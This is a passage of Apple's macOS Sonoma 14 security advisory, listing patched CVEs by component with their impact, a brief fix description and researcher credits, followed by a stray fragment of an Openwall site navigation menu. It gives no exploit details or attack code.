CVE-2023-40395: Csaba Fitzl (@theevilbit) of Offensive Security

### GPU Drivers

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to disclose kernel memory

Description: The issue was addressed with improved memory handling.

CVE-2023-40391: Antonio Zekic (@antoniozekic) of Dataflow Security

### GPU Drivers

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may lead to a denial-of-service

Description: A resource exhaustion issue was addressed with improved input validation.

CVE-2023-40441: Ron Masas of Imperva

### Graphics Drivers

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to execute arbitrary code with kernel privileges

Description: A race condition was addressed with improved state handling.

CVE-2023-42959: Murray Mike

Entry added July 16, 2024

### iCloud

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access sensitive user data

Description: A permissions issue was addressed with improved redaction of sensitive information.

CVE-2023-23495: Csaba Fitzl (@theevilbit) of Offensive Security

### iCloud Photo Library

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access a user's Photos Library

Description: A configuration issue was addressed with additional restrictions.

CVE-2023-40434: Mikko Kenttälä (@Turmio\_ ) of SensorFu

### Image Capture

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A sandboxed process may be able to circumvent sandbox restrictions

Description: An access issue was addressed with additional sandbox restrictions.

CVE-2023-38586: Yiğit Can YILMAZ (@yilmazcanyigit)

### IOAcceleratorFamily

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An attacker may be able to cause unexpected system termination or read kernel memory

Description: The issue was addressed with improved bounds checks.

CVE-2023-40436: Murray Mike

### IOUserEthernet

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to execute arbitrary code with kernel privileges

Description: The issue was addressed with improved memory handling.

CVE-2023-40396: Certik Skyfall Team

Entry added July 16, 2024

### Kernel

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to execute arbitrary code with kernel privileges

Description: A use-after-free issue was addressed with improved memory management.

CVE-2023-41995: Certik Skyfall Team, and pattern-f (@pattern\_F\_) of Ant Security Light-Year Lab

CVE-2023-42870: Zweig of Kunlun Lab

Entry updated December 22, 2023

### Kernel

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An attacker that has already achieved kernel code execution may be able to bypass kernel memory mitigations

Description: The issue was addressed with improved memory handling.

CVE-2023-41981: Linus Henze of Pinauten GmbH (pinauten.de)

### Kernel

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to execute arbitrary code with kernel privileges

Description: The issue was addressed with improved memory handling.

CVE-2023-41984: Pan ZhenPeng (@Peterpan0927) of STAR Labs SG Pte. Ltd.

### Kernel

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access sensitive user data

Description: A permissions issue was addressed with improved validation.

CVE-2023-40429: Michael (Biscuit) Thomas and 张师傅(@京东蓝军)

### Kernel

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A remote user may be able to cause kernel code execution

Description: A type confusion issue was addressed with improved checks.

CVE-2023-41060: Joseph Ravichandran (@0xjprx) of MIT CSAIL

Entry added December 22, 2023

### LaunchServices

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may bypass Gatekeeper checks

Description: A logic issue was addressed with improved checks.

CVE-2023-41067: Ferdous Saljooki (@malwarezoo) of Jamf Software and an anonymous researcher

### libpcap

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A remote user may cause an unexpected app termination or arbitrary code execution

Description: This issue was addressed with improved checks.

CVE-2023-40400: Sei K.

### libxpc

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to delete files for which it does not have permission

Description: A permissions issue was addressed with additional restrictions.

CVE-2023-40454: Zhipeng Huo (@R3dF09) of Tencent Security Xuanwu Lab (xlab.tencent.com)

### libxpc

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access protected user data

Description: An authorization issue was addressed with improved state management.

CVE-2023-41073: Zhipeng Huo (@R3dF09) of Tencent Security Xuanwu Lab (xlab.tencent.com)

### libxslt

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may disclose sensitive information

Description: The issue was addressed with improved memory handling.

CVE-2023-40403: Dohyun Lee (@l33d0hyun) of PK Security

### Maps

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to read sensitive location information

Description: The issue was addressed with improved handling of caches.

CVE-2023-40427: Adam M., and Wojciech Regula of SecuRing (wojciechregula.blog)

### Maps

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to read sensitive location information

Description: A permissions issue was addressed with additional restrictions.

CVE-2023-42957: Adam M., and Ron Masas of BreakPoint Security Research

Entry added July 16, 2024

### Messages

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to observe unprotected user data

Description: A privacy issue was addressed with improved handling of temporary files.

CVE-2023-32421: Meng Zhang (鲸落) of NorthSea, Ron Masas of BreakPoint Security Research, Brian McNulty, and Kishan Bagaria of Texts.com

### Model I/O

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing a file may lead to arbitrary code execution

Description: The issue was addressed with improved checks.

CVE-2023-42826: Michael DePlante (@izobashi) of Trend Micro Zero Day Initiative

Entry added October 19, 2023

### Model I/O

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A sandboxed process may be able to circumvent sandbox restrictions

Description: A permissions issue was addressed with additional restrictions.

CVE-2023-42918: Mickey Jin (@patch1t)

Entry added July 16, 2024

### Music

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to modify protected parts of the file system

Description: The issue was addressed with improved checks.

CVE-2023-41986: Gergely Kalman (@gergely\_kalman)

### NetFSFramework

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A sandboxed process may be able to circumvent sandbox restrictions

Description: A permissions issue was addressed with additional restrictions.

CVE-2023-40455: Zhipeng Huo (@R3dF09) of Tencent Security Xuanwu Lab (xlab.tencent.com)

### Notes

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access Notes attachments

Description: A privacy issue was addressed with improved handling of temporary files.

CVE-2023-40386: Kirin (@Pwnrin)

### OpenSSH

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A vulnerability was discovered in OpenSSHs remote forwarding

Description: This issue was addressed by updating OpenSSH to 9.3p2

CVE-2023-38408: baba yaga, an anonymous researcher

Entry added December 22, 2023

### Passkeys

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An attacker may be able to access passkeys without authentication

Description: The issue was addressed with additional permissions checks.

CVE-2023-40401: weize she and an anonymous researcher

Entry added December 22, 2023

### Photos

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Photos in the Hidden Photos Album may be viewed without authentication

Description: An authentication issue was addressed with improved state management.

CVE-2023-40393: an anonymous researcher, Berke Kırbaş, and Harsh Jaiswal

Entry added December 22, 2023

### Photos

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access edited photos saved to a temporary directory

Description: This issue was addressed with improved data protection.

CVE-2023-42949: Kirin (@Pwnrin)

Entry added July 16, 2024

### Photos Storage

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app with root privileges may be able to access private information

Description: An information disclosure issue was addressed by removing the vulnerable code.

CVE-2023-42934: Wojciech Regula of SecuRing (wojciechregula.blog)

Entry added December 22, 2023

### Power Management

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A user may be able to view restricted content from the lock screen

Description: A lock screen issue was addressed with improved state management.

CVE-2023-37448: Serkan Erayabakan, David Kotval, Akincibor, Sina Ahmadi of George Mason University, and Billy Tabrizi

Entry updated December 22, 2023

### Printing

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to modify Printer settings

Description: The issue was addressed with improved handling of caches.

CVE-2023-38607: Yiğit Can YILMAZ (@yilmazcanyigit)

Entry added December 22, 2023

### Printing

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access sensitive user data

Description: This issue was addressed with improved checks.

CVE-2023-41987: Kirin (@Pwnrin), and Wojciech Regula of SecuRing (wojciechregula.blog)

Entry added December 22, 2023

### Pro Res

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to execute arbitrary code with kernel privileges

Description: The issue was addressed with improved memory handling.

CVE-2023-41063: Certik Skyfall Team

### QuartzCore

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to cause a denial-of-service

Description: The issue was addressed with improved memory handling.

CVE-2023-40422: Tomi Tokics (@tomitokics) of iTomsn0w

### Safari

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may disclose sensitive information

Description: The issue was addressed with improved checks.

CVE-2023-39233: Luan Herrera (@lbherrera\_)

### Safari

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Safari may save photos to an unprotected location

Description: A privacy issue was addressed with improved handling of temporary files.

CVE-2023-40388: Kirin (@Pwnrin)

### Safari

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to identify what other apps a user has installed

Description: The issue was addressed with improved checks.

CVE-2023-35990: Adriatik Raci of Sentry Cybersecurity

### Safari

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Visiting a website that frames malicious content may lead to UI spoofing

Description: A window management issue was addressed with improved state management.

CVE-2023-40417: Narendra Bhati (twitter.com/imnarendrabhati) of Suma Soft Pvt. Ltd, Pune (India)

Entry updated December 22, 2023

### Sandbox

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to overwrite arbitrary files

Description: The issue was addressed with improved bounds checks.

CVE-2023-40452: Yiğit Can YILMAZ (@yilmazcanyigit)

### Sandbox

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access removable volumes without user consent

Description: A logic issue was addressed with improved checks.

CVE-2023-40430: Yiğit Can YILMAZ (@yilmazcanyigit)

Entry added December 22, 2023

### Sandbox

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Apps that fail verification checks may still launch

Description: The issue was addressed with improved checks.

CVE-2023-41996: Mickey Jin (@patch1t) and Yiğit Can YILMAZ (@yilmazcanyigit)

Entry added December 22, 2023

### Screen Sharing

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to bypass certain Privacy preferences

Description: An authorization issue was addressed with improved state management.

CVE-2023-41078: Zhipeng Huo (@R3dF09) of Tencent Security Xuanwu Lab (xlab.tencent.com)

### Share Sheet

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access sensitive data logged when a user shares a link

Description: A logic issue was addressed with improved checks.

CVE-2023-41070: Kirin (@Pwnrin)

### Shortcuts

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A shortcut may output sensitive user data without consent

Description: This issue was addressed by adding an additional prompt for user consent.

CVE-2023-40541: Noah Roskin-Frazee (ZeroClicks.ai Lab) and James Duffy (mangoSecure)

### Shortcuts

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to bypass Privacy preferences

Description: The issue was addressed with improved permissions logic.

CVE-2023-41079: Ron Masas of BreakPoint.sh and an anonymous researcher

### Spotlight

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to gain root privileges

Description: The issue was addressed with improved checks.

CVE-2023-40443: Gergely Kalman (@gergely\_kalman)

Entry added December 22, 2023

### StorageKit

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to read arbitrary files

Description: This issue was addressed with improved validation of symlinks.

CVE-2023-41968: Mickey Jin (@patch1t) and James Hutchins

### System Preferences

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may bypass Gatekeeper checks

Description: The issue was addressed with improved checks.

CVE-2023-40450: Thijs Alkemade (@xnyhps) from Computest Sector 7

### System Settings

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A Wi-Fi password may not be deleted when activating a Mac in macOS Recovery

Description: This issue was addressed through improved state management.

CVE-2023-42948: Andrew Haggard

Entry added July 16, 2024

### TCC

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to access user-sensitive data

Description: The issue was addressed with improved checks.

CVE-2023-40424: Arsenii Kostromin (0x3c3e), Joshua Jewett (@JoshJewett33), and Csaba Fitzl (@theevilbit) of Offensive Security

### WebKit

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may lead to arbitrary code execution

Description: A use-after-free issue was addressed with improved memory management.

WebKit Bugzilla: 249451

CVE-2023-39434: Francisco Alonso (@revskills), and Dohyun Lee (@l33d0hyun) of PK Security

WebKit Bugzilla: 258992

CVE-2023-40414: Francisco Alonso (@revskills)

Entry updated December 22, 2023

### WebKit

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may lead to arbitrary code execution

Description: The issue was addressed with improved checks.

WebKit Bugzilla: 256551

CVE-2023-41074: 이준성(Junsung Lee) of Cross Republic and Jie Ding(@Lime) from HKUS3 Lab

Entry updated December 22, 2023

### WebKit

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may lead to arbitrary code execution

Description: The issue was addressed with improved memory handling.

WebKit Bugzilla: 239758

CVE-2023-35074: Ajou University Abysslab Dong Jun Kim(@smlijun) and Jong Seong Kim(@nevul37)

Entry updated December 22, 2023

### WebKit

Available for: Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may lead to arbitrary code execution. Apple is aware of a report that this issue may have been actively exploited against versions of iOS before iOS 16.7.

Description: The issue was addressed with improved checks.

WebKit Bugzilla: 261544

CVE-2023-41993: Bill Marczak of The Citizen Lab at The University of Toronto's Munk School and Maddie Stone of Google's Threat Analysis Group

### WebKit

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A user's password may be read aloud by VoiceOver

Description: This issue was addressed with improved redaction of sensitive information.

WebKit Bugzilla: 248717

CVE-2023-32359: Claire Houston

Entry added December 22, 2023

### WebKit

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: A remote attacker may be able to view leaked DNS queries with Private Relay turned on

Description: This issue was addressed by removing the vulnerable code.

WebKit Bugzilla: 257303

CVE-2023-40385: Anonymous

Entry added December 22, 2023

### WebKit

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: Processing web content may lead to arbitrary code execution

Description: A correctness issue was addressed with improved checks.

WebKit Bugzilla: 258592

CVE-2023-42833: Dong Jun Kim (@smlijun), and Jong Seong Kim (@nevul37) of AbyssLab

Entry added December 22, 2023

### Wi-Fi

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to cause unexpected system termination or write kernel memory

Description: A memory corruption issue was addressed by removing the vulnerable code.

CVE-2023-38610: Wang Yu of Cyberserval

Entry added December 22, 2023

### Windows Server

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to unexpectedly leak a user's credentials from secure text fields

Description: An authentication issue was addressed with improved state management.

CVE-2023-41066: An anonymous researcher, Jeremy Legendre of MacEnhance, and Felix Kratz

Entry updated December 22, 2023

### XProtectFramework

Available for: Mac Studio (2022 and later), iMac (2019 and later), Mac Pro (2019 and later), Mac mini (2018 and later), MacBook Air (2018 and later), MacBook Pro (2018 and later), and iMac Pro (2017)

Impact: An app may be able to modify protected parts of the file system

Description: A race condition was addressed with improved locking.

CVE-2023-41979: Koh M. Nakagawa (@tsunek0h)

## Additional recognition

### Airport

We would like to acknowledge Adam M., Noah Roskin-Frazee and Professor Jason Lau (ZeroClicks.ai Lab) for their assistance.

### AppKit

We would like to acknowledge an anonymous researcher for their assistance.

### Apple Neural Engine

We would like to acknowledge pattern-f (@pattern\_F\_) of Ant Security Light-Year Lab for their assistance.

Entry added December 22, 2023

### AppSandbox

We would like to acknowledge Kirin (@Pwnrin) for their assistance.

### Archive Utility

We would like to acknowledge Mickey Jin (@patch1t) for their assistance.

### Audio

We would like to acknowledge Mickey Jin (@patch1t) for their assistance.

### Bluetooth

We would like to acknowledge Jianjun Dai and Guang Gong of 360 Vulnerability Research Institute for their assistance.

### Books

We would like to acknowledge Aapo Oksman of Nixu Cybersecurity for their assistance.

Entry added December 22, 2023

### Control Center

We would like to acknowledge Yiğit Can YILMAZ (@yilmazcanyigit) for their assistance.

Entry added December 22, 2023

### Core Location

We would like to acknowledge Wouter Hennen for their assistance.

### CoreMedia Playback

We would like to acknowledge Mickey Jin (@patch1t) for their assistance.

### CoreServices

We would like to acknowledge Thijs Alkemade of Computest Sector 7, Wojciech Reguła (@\_r3ggi) of SecuRing, and an anonymous researcher for their assistance.

Entry added December 22, 2023

### Data Detectors UI

We would like to acknowledge Abhay Kailasia (@abhay\_kailasia) of Lakshmi Narain College Of Technology Bhopal for their assistance.

### Find My

We would like to acknowledge Cher Scarlett for their assistance.

### Home

We would like to acknowledge Jake Derouin (jakederouin.com) for their assistance.

### IOGraphics

We would like to acknowledge an anonymous researcher for their assistance.

### IOUserEthernet

We would like to acknowledge Certik Skyfall Team for their assistance.

Entry added December 22, 2023

### Kernel

We would like to acknowledge Bill Marczak of The Citizen Lab at The University of Toronto's Munk School and Maddie Stone of Google's Threat Analysis Group, Xinru Chi of Pangu Lab, 永超 王 for their assistance.

### libxml2

We would like to acknowledge OSS-Fuzz, Ned Williamson of Google Project Zero for their assistance.

### libxpc

We would like to acknowledge an anonymous researcher for their assistance.

### libxslt

We would like to acknowledge Dohyun Lee (@l33d0hyun) of PK Security, OSS-Fuzz, Ned Williamson of Google Project Zero for their assistance.

### Mail

We would like to acknowledge Taavi Eomäe from Zone Media OÜ for their assistance.

Entry added December 22, 2023

### Menus

We would like to acknowledge Matthew Denton of Google Chrome Security for their assistance.

Entry added December 22, 2023

### NSURL

We would like to acknowledge Zhanpeng Zhao (行之), 糖豆爸爸(@晴天组织) for their assistance.

### PackageKit

We would like to acknowledge Csaba Fitzl (@theevilbit) of Offensive Security, an anonymous researcher for their assistance.

### Photos

We would like to acknowledge Anatolii Kozlov, Dawid Pałuska, Lyndon Cornelius, and Paul Lurin for their assistance.

Entry updated July 16, 2024

### Power Services

We would like to acknowledge Mickey Jin (@patch1t) for their assistance.

Entry added December 22, 2023

### Reminders

We would like to acknowledge Paweł Szafirowski for their assistance.

### Safari

We would like to acknowledge Kang Ali of Punggawa Cyber Security for their assistance.

### Sandbox

We would like to acknowledge Yiğit Can YILMAZ (@yilmazcanyigit) for their assistance.

### SharedFileList

We would like to acknowledge Christopher Lopez - @L0Psec and Kandji, Leo Pitt of Zoom Video Communications, Masahiro Kawada (@kawakatz) of GMO Cybersecurity by Ierae, and Ross Bingham (@PwnDexter) for their assistance.

Entry updated December 22, 2023

### Shortcuts

We would like to acknowledge Alfie CG, Christian Basting of Bundesamt für Sicherheit in der Informationstechnik, Cristian Dinca of "Tudor Vianu" National High School of Computer Science, Romania, Giorgos Christodoulidis, Jubaer Alnazi of TRS Group Of Companies, KRISHAN KANT DWIVEDI (@xenonx7), and Matthew Butler for their assistance.

Entry updated April 24, 2024

### Software Update

We would like to acknowledge Omar Siman for their assistance.

### Spotlight

We would like to acknowledge Abhay Kailasia (@abhay\_kailasia) of Lakshmi Narain College Of Technology Bhopal, Dawid Pałuska for their assistance.

### StorageKit

We would like to acknowledge Mickey Jin (@patch1t) for their assistance.

### Video Apps

We would like to acknowledge James Duffy (mangoSecure) for their assistance.

### WebKit

We would like to acknowledge Khiem Tran, Narendra Bhati From Suma Soft Pvt. Ltd, Pune (India), and an anonymous researcher for their assistance.

### WebRTC

We would like to acknowledge anonymous researcher for their assistance.

### Wi-Fi

We would like to acknowledge Adam M., and Wang Yu of Cyberserval for their assistance.

Entry updated December 22, 2023

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: August 19, 2024

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of macOS Sonoma 14

[United States](https://support.apple.com/en-us/120950/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from www.openwall.com_b1a0d5fe_20250110_133622.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & 